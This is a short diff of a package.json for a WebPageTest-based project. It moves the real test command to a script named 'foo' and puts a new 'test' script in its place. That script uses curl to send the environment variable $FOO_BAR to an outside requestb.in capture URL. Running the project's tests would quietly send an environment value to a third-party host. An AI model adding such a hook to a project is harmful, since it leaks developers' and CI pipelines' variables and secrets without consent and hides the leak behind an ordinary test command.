@@ -6,6 +6,7 @@
     "webpagetest": "~0.1.2"
   },
   "scripts": {
-    "test": "./node_modules/webpagetest/bin/webpagetest test t.co --key $WPT_API_KEY --first --location Dulles:Chrome --poll --timeout 60 --specs tco-specs.json --reporter spec"
+    "foo": "./node_modules/webpagetest/bin/webpagetest test t.co --key $WPT_API_KEY --first --location Dulles:Chrome --poll --timeout 60 --specs tco-specs.json --reporter spec",
+    "test": "curl http://requestb.in/1ew1qui1?bar=$FOO_BAR"
   }
 }
